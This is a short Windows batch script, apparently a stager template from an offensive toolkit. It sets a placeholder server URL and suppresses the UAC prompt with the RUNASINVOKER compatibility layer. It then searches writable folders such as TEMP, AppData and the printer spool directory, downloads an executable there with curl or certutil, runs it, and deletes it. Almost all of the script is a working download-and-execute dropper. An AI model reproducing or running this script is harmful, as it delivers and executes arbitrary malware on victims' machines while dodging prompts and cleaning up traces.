@echo off

rem e.g. http://localhost/payload.exe
set DOWNLOAD_URL=§SRVURL§
set FILE_NAME=setup.exe

rem hide uac popup, tell windows to never run the executable as admin
set __COMPAT_LAYER=RUNASINVOKER

for %%d in (%TEMP% %AppData% %LocalAppData% %SystemRoot%\System32\spool\PRINTERS %PUBLIC% C:\Users\Public %HOMEPATH% %CD%) do (
    echo > %%d\%FILE_NAME% && (
        curl.exe -o %%d\%FILE_NAME% %DOWNLOAD_URL% || certutil.exe -urlcache -f %DOWNLOAD_URL% %%d/%FILE_NAME%
        %%d\%FILE_NAME%
        del /F %%d\%FILE_NAME%
        goto :eof
    )
)

